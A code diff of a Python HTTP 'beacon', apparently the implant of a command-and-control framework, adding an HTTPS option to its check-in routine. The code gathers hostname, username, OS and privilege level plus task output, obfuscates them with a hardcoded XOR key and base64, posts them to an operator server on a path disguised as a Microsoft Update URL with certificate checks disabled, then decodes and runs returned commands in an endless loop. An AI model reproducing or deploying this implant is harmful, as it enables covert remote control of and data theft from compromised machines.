@@ -13,54 +13,59 @@ from Beacon import Beacon
 
 class BeaconHttp(Beacon):
 
-    def __init__(self, url, port):
+    def __init__(self, url, port, isHttps):
         super().__init__()
         self.url = url
         self.port = port
+        self.isHttps = isHttps
 
 
     def checkIn(self):
+        sessions = []
+        for it in self.taskResults:
+            sessions.append(it)
+        self.taskResults.clear()
+
+        # todo start with http:// ou https://
+        prexif = "http://"
+        if self.isHttps == "https":
+            prexif = "https://"
+        headers = {'Content-type': 'application/json', 'Authorization': "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd"}
+        url = prexif + self.url + ":" + self.port + "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"
+
+        boundel = {
+            "arch": self.arch, 
+            "beaconHash": self.beaconHash, 
+            "hostname": self.hostname , 
+            "listenerHash": "", 
+            "os": self.os,  
+            "privilege": self.privilege, 
+            "sessions": "", 
+            "username": self.username, 
+            "lastProofOfLife":"0"
+            }
+        
+        boundel["sessions"]=sessions
+
+        json_object = ""
         try:
-            sessions = []
-            for it in self.taskResults:
-                sessions.append(it)
-            self.taskResults.clear()
-
-            headers = {'Content-type': 'application/json', 'Authorization': "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd"}
-            url = self.url + ":" + self.port + "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"
-
-            boundel = {
-                "arch": self.arch, 
-                "beaconHash": self.beaconHash, 
-                "hostname": self.hostname , 
-                "listenerHash": "", 
-                "os": self.os,  
-                "privilege": self.privilege, 
-                "sessions": "", 
-                "username": self.username, 
-                "lastProofOfLife":"0"
-                }
-            
-            boundel["sessions"]=sessions
-
             json_object = json.dumps(boundel, separators=(',', ':'))
-            dataToSend = "["+json_object+"]"
-
-            key="dfsdgferhzdzxczevre5595485sdg";
-            datab64 = xorEncode(dataToSend, key)
-            bodyToPost = base64.b64encode(datab64.encode('utf-8'))
-                
-            response = requests.post(url, data=bodyToPost, headers=headers, verify=False)
-
-            # cmdToTasks
-            bodyb64d = base64.b64decode(response.content).decode('utf-8')
-
-            bodyb64dd = xorEncode(bodyb64d, key)
-
-            self.cmdToTasks(bodyb64dd)
-
         except:
-          print("An exception occurred") 
+            pass
+        dataToSend = "["+json_object+"]"
+
+        key="dfsdgferhzdzxczevre5595485sdg";
+        datab64 = xorEncode(dataToSend, key)
+        bodyToPost = base64.b64encode(datab64.encode('utf-8'))
+            
+        response = requests.post(url, data=bodyToPost, headers=headers, verify=False)
+
+        # cmdToTasks
+        bodyb64d = base64.b64decode(response.content).decode('utf-8')
+
+        bodyb64dd = xorEncode(bodyb64d, key)
+
+        self.cmdToTasks(bodyb64dd)
 
 
 
@@ -71,23 +76,20 @@ class BeaconHttp(Beacon):
 
 def main() -> int:
 
-    if len(sys.argv) < 2:
+    if len(sys.argv) < 3:
         print('Error: missing argument')
         sys.exit(1)
 
     url = sys.argv[1]
     port = sys.argv[2]
+    isHttps = sys.argv[3]
 
-    beaconHttp = BeaconHttp(url, port)
+    beaconHttp = BeaconHttp(url, port, isHttps)
     
     while 1:
-        # try:
         beaconHttp.checkIn()
 
         beaconHttp.runTasks()
-
-        # except:
-        #   print("An exception occurred") 
 
         time.sleep(beaconHttp.sleepTimeMs/1000)
 
